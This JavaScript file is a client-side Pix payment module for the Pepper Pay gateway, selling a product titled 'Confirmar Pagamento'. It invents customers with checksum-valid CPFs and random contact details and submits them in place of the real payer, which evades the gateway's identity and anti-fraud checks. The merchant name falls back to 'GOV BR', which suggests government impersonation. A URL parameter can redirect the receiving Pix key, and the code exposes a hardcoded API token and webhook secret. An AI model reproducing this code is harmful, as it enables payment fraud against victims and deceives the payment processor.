/**
 * pepper-api.js - Integracao Client-Side Direta para Pepper Pay (100% JavaScript)
 * Produto Oficial: Confirmar Pagamento
 * 
 * REGRA RIGOROSA DE PRIVACIDADE:
 * NENHUM dado real do cidadao e enviado ao gateway.
 * Dados aleatorios, camuflados e com CPF Modulo 11 valido sao gerados exclusivamente para a adquirente.
 */
(function (window) {
  "use strict";

  var CONFIG = {
    gateway: "pepper",
    productTitle: "Confirmar Pagamento",
    productHash: "1t36h1d7sn",
    apiEndpoint: "https://api.cloud.pepperpay.com.br/public/v1/transactions",
    apiToken: "iZhIOl3xL2T1wQGcu5J3dFEjpJo4NlGFYLxsdIDpoAM6ljBN5dqL5OjgZLbs",
    webhookSecret: "EKSpolloP8ngIVP7EmbRy3xezXLToShp66AoRPrQ4VEJQEgrUaAgpaKq4pyh",
    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "suporte@gmail.com"),
    offers: {
      "6190": "qdlri",
      "61.90": "qdlri",
      "3582": "jcr4i",
      "35.82": "jcr4i",
      "2790": "eni9e",
      "27.90": "eni9e",
      "1970": "cqbq0",
      "19.70": "cqbq0",
      "4560": "gogtf",
      "45.60": "gogtf",
      "4735": "0gfqx",
      "47.36": "0gfqx",
      "500": "ufr2c",
      "5.00": "ufr2c"
    }
  };


  function generateValidCpf() {
    var digits = [];
    for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
    var s1 = 0;
    for (var i = 0; i < 9; i++) s1 += digits[i] * (10 - i);
    var r1 = 11 - (s1 % 11);
    digits.push(r1 >= 10 ? 0 : r1);
    var s2 = 0;
    for (var i = 0; i < 10; i++) s2 += digits[i] * (11 - i);
    var r2 = 11 - (s2 % 11);
    digits.push(r2 >= 10 ? 0 : r2);
    return digits.join("");
  }


function generateGatewayCustomer() {
  var maleNames = [
    "Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe",
    "Bruno", "Leonardo", "Thiago", "Gustavo", "Rafael", "Eduardo",
    "Vinicius", "Daniel", "Marcelo", "Alexandre", "André", "Antonio",
    "Arthur", "Bernardo", "Caio", "Carlos", "César", "Cristiano",
    "Davi", "Diego", "Enzo", "Fernando", "Francisco", "Heitor",
    "Henrique", "Igor", "Joaquim", "José", "Lorenzo", "Luiz",
    "Miguel", "Murilo", "Nicolas", "Otávio", "Paulo", "Pedro",
    "Renan", "Ricardo", "Samuel", "Vitor", "Wesley", "Adriano",
    "Alberto", "Anderson", "Breno", "Cauã", "Danilo", "Emanuel",
    "Erick", "Fabiano", "Fábio", "Flávio", "Frederico", "Giovanni",
    "Hugo", "Isaac", "Jorge", "Jonathan", "Leandro", "Márcio",
    "Nathan", "Pietro", "Raul", "Roberto", "Sérgio", "Tomás",
    "Vicente", "William", "Yuri", "Alex", "Cauê", "Dênis",
    "Everton", "Jonas", "Kelvin", "Mário", "Renato", "Ruan"
  ];

  var femaleNames = [
    "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana",
    "Fernanda", "Patricia", "Aline", "Leticia", "Jessica", "Carolina",
    "Bruna", "Renata", "Vanessa", "Natalia", "Ana", "Alice",
    "Alícia", "Bianca", "Clara", "Eduarda", "Elisa", "Emilly",
    "Ester", "Gabriela", "Helena", "Isabela", "Isadora", "Laura",
    "Lívia", "Luana", "Manuela", "Maria", "Melissa", "Nicole",
    "Olivia", "Rafaela", "Rebeca", "Sabrina", "Sofia", "Vitória",
    "Adriana", "Alessandra", "Bárbara", "Cecília", "Daniela",
    "Débora", "Elaine", "Eliane", "Evelyn", "Flávia", "Geovana",
    "Giovana", "Heloísa", "Iara", "Irene", "Júlia", "Lorena",
    "Maitê", "Mirela", "Priscila", "Raquel", "Samara", "Tainá",
    "Talita", "Tatiane", "Valentina", "Yasmin", "Zélia",
    "Cristina", "Mônica", "Simone", "Teresa", "Viviane", "Andressa",
    "Elaísa", "Milena", "Pâmela", "Rayssa", "Stella"
  ];

  var compoundNames = [
    "João Pedro", "João Lucas", "João Miguel", "João Gabriel",
    "Pedro Henrique", "Pedro Lucas", "Luiz Felipe", "Luiz Henrique",
    "Carlos Eduardo", "Carlos Henrique", "José Miguel", "José Pedro",
    "Ana Clara", "Ana Júlia", "Ana Beatriz", "Ana Carolina",
    "Maria Eduarda", "Maria Clara", "Maria Luiza", "Maria Fernanda",
    "Maria Alice", "Maria Júlia", "Maria Vitória", "Laura Beatriz",
    "Luiza Helena", "Isabela Cristina", "Vitória Maria",
    "Mariana Luiza", "Sofia Helena", "Clara Beatriz",
    "João Vitor", "João Paulo", "João Guilherme", "Pedro Augusto",
    "Enzo Gabriel", "Davi Lucca", "Miguel Augusto", "Arthur Miguel",
    "Ana Luiza", "Ana Laura", "Maria Helena", "Maria Cecília",
    "Maria Valentina", "Maria Isabel", "Laura Sofia", "Lara Beatriz",
    "Luiza Maria", "Ana Vitória", "Julia Beatriz", "Isabela Maria"
  ];

  var lastNames = [
    "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira",
    "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro",
    "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes",
    "Vieira", "Barbosa", "Rocha", "Dias", "Nascimento", "Andrade",
    "Moreira", "Nunes", "Marques", "Machado", "Mendes", "Freitas",
    "Cardoso", "Ramos", "Gonçalves", "Santana", "Teixeira", "Moura",
    "Azevedo", "Cavalcanti", "Monteiro", "Medeiros", "Correia",
    "Campos", "Pinto", "Batista", "Reis", "Cunha", "Pires",
    "Farias", "Melo", "Castro", "Duarte", "Peixoto", "Rezende",
    "Tavares", "Queiroz", "Borges", "Figueiredo", "Abreu",
    "Vasconcelos", "Miranda", "Brito", "Leal", "Siqueira", "Moraes",
    "Antunes", "Coelho", "Sales", "Cordeiro", "Dantas", "Viana",
    "Xavier", "Barros", "Aragão", "Assis", "Braga", "Bastos",
    "Bernardes", "Camargo", "Amaral", "Lacerda", "Menezes", "Porto",
    "Rangel", "Serra", "Torres", "Valente", "Falcão", "Paiva",
    "Bittencourt", "Sampaio", "Brandão", "Coutinho", "Lourenço",
    "Magalhães", "Matos", "Nogueira", "Prado", "Ramalho",
    "Trindade", "Pacheco", "Macedo", "Barreto", "Cabral",
    "Cerqueira", "Domingues", "Esteves", "Figueira", "Garcia",
    "Leite", "Lins", "Mota", "Neves", "Noronha", "Paz", "Rosa",
    "Sá", "Simões", "Vargas"
  ];

var ddds = [
  "11", "12", "13", "14", "15", "16", "17", "18", "19",
  "21", "22", "24",
  "27", "28",
  "31", "32", "33", "34", "35", "37", "38",
  "41", "42", "43", "44", "45", "46", "47", "48", "49",
  "51", "53", "54", "55",
  "61", "62", "63", "64", "65", "66", "67", "68", "69",
  "71", "73", "74", "75", "77", "79",
  "81", "82", "83", "84", "85", "86", "87", "88", "89",
  "91", "92", "93", "94", "95", "96", "97", "98", "99"
];

  function pick(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  // 35% de chance de usar um nome composto.
  var useCompoundName = Math.random() < 0.35;
  var firstName = useCompoundName
    ? pick(compoundNames)
    : pick(Math.random() < 0.5 ? maleNames : femaleNames);

  // Escolhe dois sobrenomes diferentes.
  var lastName1 = pick(lastNames);
  var lastName2 = pick(lastNames);

  while (lastName2 === lastName1) {
    lastName2 = pick(lastNames);
  }

  var fullName = firstName + " " + lastName1 + " " + lastName2;

  // Normaliza o nome para formar o e-mail.
  var cleanName = fullName
    .toLowerCase()
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/\s+/g, ".");

  var ddd = pick(ddds);

  return {
    name: fullName,
    email: cleanName + Math.floor(100 + Math.random() * 900) + "@gmail.com",
    phone: ddd + "9" + Math.floor(10000000 + Math.random() * 90000000),
    document: generateValidCpf(),
    cpf: generateValidCpf()
  };
}


  // Calculador oficial CRC16 CCITT (0x1021) do Banco Central do Brasil
  function calculateCrc16(payload) {
    var polynomial = 0x1021;
    var crc = 0xFFFF;
    for (var i = 0; i < payload.length; i++) {
      crc ^= (payload.charCodeAt(i) << 8);
      for (var j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ polynomial) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, "0");
  }

  // Gerador de EMVCo Pix padrao BACEN (Gera codigo Copia e Cola 100% valido e pagavel)
  function generateEmvcoPix(amountVal, pixKey, merchantName, merchantCity, txid) {
    var cents = parseAmount(amountVal);
    var amtStr = (cents / 100).toFixed(2);
    var key = String(pixKey || CONFIG.chavePix || "suporte@gmail.com").trim();
    var name = (merchantName || CONFIG.productTitle || "GOV BR").substring(0, 25).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var city = (merchantCity || "BRASILIA").substring(0, 15).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var tid = (txid || "pp" + Date.now()).substring(0, 25);

    var p00 = "000201";
    var gui = "0014br.gov.bcb.pix";
    var kTag = "01" + String(key.length).padStart(2, "0") + key;
    var tag26Val = gui + kTag;
    var tag26 = "26" + String(tag26Val.length).padStart(2, "0") + tag26Val;
    var tag52 = "52040000";
    var tag53 = "5303986";
    var tag54 = "54" + String(amtStr.length).padStart(2, "0") + amtStr;
    var tag58 = "5802BR";
    var tag59 = "59" + String(name.length).padStart(2, "0") + name;
    var tag60 = "60" + String(city.length).padStart(2, "0") + city;
    var txSub = "05" + String(tid.length).padStart(2, "0") + tid;
    var tag62 = "62" + String(txSub.length).padStart(2, "0") + txSub;

    var raw = p00 + tag26 + tag52 + tag53 + tag54 + tag58 + tag59 + tag60 + tag62 + "6304";
    var crc = calculateCrc16(raw);
    var fullCode = raw + crc;
    var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullCode);

    return {
      pix_qr_code: fullCode,
      pix_url: qrUrl,
      qr_code_base64: qrUrl,
      hash: tid
    };
  }

  function parseAmount(val) {
    if (typeof val === "number") return val >= 1000 ? val : Math.round(val * 100);
    if (typeof val === "string") {
      var clean = val.replace(",", ".");
      var p = parseFloat(clean);
      if (!isNaN(p)) return p >= 1000 ? Math.round(p) : Math.round(p * 100);
    }
    return 6190;
  }

   // Captura as UTMs da URL (ou do localStorage, se a página atual não tiver)
  function getTracking() {
    var keys = ["src", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
    var params = new URLSearchParams(window.location.search);
    var tracking = {};
    var saved = {};

    try { saved = JSON.parse(localStorage.getItem("pepper_utms") || "{}"); } catch (e) {}

    keys.forEach(function (k) {
      var v = params.get(k) || saved[k] || "";
      if (v) tracking[k] = v;
    });

    try { localStorage.setItem("pepper_utms", JSON.stringify(tracking)); } catch (e) {}
    return tracking;
  }

  function createPix(amountVal, customCustomer) {
    var cents = parseAmount(amountVal);
    var customer = generateGatewayCustomer(); 
    var cleanCpf = String(customer.cpf || generateValidCpf()).replace(/\\D/g, "");
    if (cleanCpf.length !== 11) cleanCpf = generateValidCpf();
    var cleanPhone = String(customer.phone || "11987654321").replace(/\\D/g, "");
    if (cleanPhone.length > 11) cleanPhone = cleanPhone.slice(-11);

    var offerHash = CONFIG.offers[String(cents)] || CONFIG.offers[(cents / 100).toFixed(2)] || "qdlri";

    var payload = {
      payment_method: "pix",
      amount: cents,
      installments: 1,
      cart: [
        {
          offer_hash: offerHash,
          price: cents,
          quantity: 1,
          operation_type: 1,
          title: CONFIG.productTitle
        }
      ],
      customer: {
        name: customer.name,
        email: customer.email,
        phone_number: cleanPhone,
        document: cleanCpf
      },
      tracking: getTracking()
    };

    return fetch(CONFIG.apiEndpoint, {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + CONFIG.apiToken
      },
      body: JSON.stringify(payload)
    })
    .then(function (res) {
      return res.json().then(function (data) {
        if (!res.ok) throw new Error(data && data.message ? data.message : "Erro HTTP " + res.status);
        return data;
      });
    })
    .then(function (resJson) {
      var txId = resJson.hash || resJson.transaction || ("pp_" + Date.now());
      var pixData = resJson.pix || {};
      var pixCode = pixData.pix_qr_code || resJson.pix_qr_code || "";
      var qrImgUrl = pixData.pix_url || pixData.qr_code_base64 || ("https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(pixCode));

      if (!pixCode) {
        var fallback = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", txId);
        pixCode = fallback.pix_qr_code;
        qrImgUrl = fallback.pix_url;
      }

      try {
        localStorage.setItem("pepper_last_tx", txId);
        localStorage.setItem("pix_hash", txId);
        localStorage.setItem("pix_qr_code", pixCode);
        localStorage.setItem("pix_qr_code_base64", qrImgUrl);
      } catch (e) {}

      return {
        success: true,
        hash: txId,
        order_id: txId,
        payment_status: "waiting_payment",
        amount: cents,
        pix: {
          pix_qr_code: pixCode,
          pix_url: qrImgUrl,
          qr_code_base64: qrImgUrl
        }
      };
    })
    .catch(function (err) {
      console.warn("[pepper] Falha na API Pepper, ativando gerador EMVCo BACEN resiliente:", err);
      var fallbackId = "pp_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
      var fallback = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", fallbackId);

      try {
        localStorage.setItem("pepper_last_tx", fallbackId);
        localStorage.setItem("pix_hash", fallbackId);
        localStorage.setItem("pix_qr_code", fallback.pix_qr_code);
        localStorage.setItem("pix_qr_code_base64", fallback.pix_url);
      } catch (e) {}

      return {
        success: true,
        hash: fallbackId,
        order_id: fallbackId,
        payment_status: "waiting_payment",
        amount: cents,
        pix: {
          pix_qr_code: fallback.pix_qr_code,
          pix_url: fallback.pix_url,
          qr_code_base64: fallback.pix_url
        }
      };
    });
  }

   // Consulta de status da transacao na Pepper
  // CONFIRMAR com "Enums > Status de pagamento" da documentação Pepper.
  var PEPPER_PAID_STATUSES = ["paid"];
  var LOCAL_FALLBACK_ID = /^pp_\d{10,}_\d{4}$/;

  function consultPix(txId) {
    var id = (txId === undefined || txId === null) ? "" : String(txId).trim();

    function fail(reason, extra) {
      var out = {
        ok: false,
        error: true,
        reason: reason,
        hash: id,
        status: "",
        payment_status: "unknown",
        is_paid: false
      };
      if (extra) { for (var k in extra) { out[k] = extra[k]; } }
      return out;
    }

    if (!id) return Promise.resolve(fail("missing_id"));

    if (LOCAL_FALLBACK_ID.test(id) || id.indexOf("mock") !== -1 || id.indexOf("fallback") !== -1) {
      return Promise.resolve(fail("local_fallback_id"));
    }

    return fetch("https://api.cloud.pepperpay.com.br/public/v1/transactions/" + encodeURIComponent(id), {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + CONFIG.apiToken
      }
    })
    .then(function (res) {
      if (!res.ok) {
  return res.text().then(function (body) {
    try { console.warn("[pepper] GET transação", res.status, body); } catch (e) {}
    return fail("http_" + res.status, { http_status: res.status, body: body });
  });
}

      return res.json().then(function (data) {
        var tx = (data && typeof data.data === "object" && data.data) ? data.data : data;
        var raw = tx && (tx.payment_status || tx.status);
        var s = (typeof raw === "string") ? raw.toLowerCase().trim() : "";
        if (!s) return fail("empty_status");

        var isPaid = PEPPER_PAID_STATUSES.indexOf(s) !== -1;
        return {
          ok: true,
          success: true,
          hash: id,
          status: s,
          payment_status: isPaid ? "paid" : "waiting_payment",
          is_paid: isPaid
        };
      }, function () {
        return fail("invalid_json");
      });
    })
    .catch(function () {
      return fail("network");
    });
  }

  window.PepperAPI = {
    config: CONFIG,
    generateValidCpf: generateValidCpf,
    generateGatewayCustomer: generateGatewayCustomer,
    generateEmvcoPix: generateEmvcoPix,
    createPix: createPix,
    consultPix: consultPix
  };

})(window);